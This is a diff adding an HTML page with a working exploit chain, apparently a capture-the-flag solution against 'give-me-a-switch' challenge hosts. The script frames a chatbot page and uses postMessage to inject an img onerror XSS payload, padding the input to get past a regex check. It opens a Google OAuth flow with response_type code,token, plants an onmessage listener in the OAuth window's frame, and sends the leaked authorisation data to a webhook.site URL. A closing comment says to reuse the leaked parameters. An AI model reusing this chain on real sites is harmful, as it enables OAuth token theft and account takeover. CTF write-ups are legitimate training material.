@@ -1,0 +1,31 @@
+<script>
+    window.onload = () => {
+        var exfilt_url = "https://webhook.site/457b29aa-defc-405a-8d90-4e7acfb9dcff?leak=";
+        var oauth_url  = "https://accounts.google.com/o/oauth2/v2/auth?response_type=code,token&redirect_uri=https://app-give-me-a-switch.esaip-cyber.com/auth/callback&scope=email&client_id=374058566213-j138s6n7s5dmpqqj36nqj1c2kk62eivo.apps.googleusercontent.com&state=aaaa";
+
+        // step2 | trigger non-happy path OAuth -> invalid state
+        var step2 = `var step2 = window.open('${oauth_url}')`;
+
+        // step3 | setup onmessage backdoor
+        var step3 = `setInterval(function() {
+            if(step2 && step2.frames[0]) {
+                step2.frames[0].eval(
+                    'onmessage = e => { fetch(\\'${exfilt_url}\\' + encodeURIComponent(e.data.caller)) };'
+                )
+            }
+        }, 50);`;
+
+        // step1 | setup XSS
+        var step1 = document.createElement("iframe");
+        step1.src = "https://chat-give-me-a-switch.esaip-cyber.com/bot";
+        document.body.appendChild(step1);
+
+        step1.onload = () => {
+            step1.contentWindow.postMessage({"action": "init"}, "*");
+            step1.contentWindow.postMessage({"action": "ask", "question": `${"a".repeat(1000)}>`}, "*"); // Bypass regex.test
+            step1.contentWindow.postMessage({"action": "ask", "question": `<img src="x" onerror="${step2}; ${step3}">`}, "*");
+        }
+    }
+</script>
+
+<!-- Then, generate the current state of your account and use it with the leaked parameters :p -->
